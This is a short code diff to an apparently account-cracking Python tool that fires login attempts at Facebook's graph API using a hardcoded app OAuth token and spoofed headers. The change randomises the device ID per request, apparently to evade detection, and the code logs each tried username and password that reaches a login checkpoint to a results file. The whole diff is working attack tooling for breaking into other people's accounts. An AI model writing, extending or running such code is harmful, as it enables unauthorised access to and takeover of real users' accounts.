@@ -747,10 +747,10 @@ class Facebook:
                         'Host': 'b-graph.facebook.com',
                         'Authorization': 'OAuth 121876164619130|1ab2c5c902faedd339c14b2d58e929dc',
                         'x-fb-request-analytics-tags': '{"network_tags":{"product":"121876164619130","purpose":"none","retry_attempt":"0"},"application_tags":"graphservice"}',
-                        'x-fb-connection-type': 'dummy',
+                        'x-fb-connection-type': 'WIFI',
                         'app-scope-id-header': 'd2c663d1-ed7c-471d-bd58-f4a78f1d3acc',
                         'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request',
-                        'x-zero-f-device-id': 'd188a6c7-b574-4395-93dc-242870addd73',
+                        'x-zero-f-device-id': str(uuid.uuid4()),
                         'x-zero-state': 'unknown',
                         'x-zero-eh': '664c0faaac849cb891d0a261fbb72a12',
                         'content-type': 'application/x-www-form-urlencoded',
@@ -819,7 +819,7 @@ class Facebook:
                         elif 'redirect_login_challenges' in server_respon2 or 'com.bloks.www.ap.two_step_verification.entrypoint_async' in server_respon2:
                             log['checkpoint'] += 1
                             KenXinDev(Panel(Panel(f"[bold yellow][+] Username : {user}\n[+] Password : {pwd}\n[+] User Agent : {ua_str}[/bold yellow]", style='bold yellow'), width=80, style='bold bright_black', title='[bold yellow]Login-Checkpoint[/bold yellow]'))
-                            open(file_result['checkpoint'], 'a', encoding='utf-8').write(f"{user}|{pwd}|{ua_str}\n")
+                            open(file_result['checkpoint'], 'a', encoding='utf-8').write(f"{user}|{pwd}\n")
                             break
                         else:
                             continue
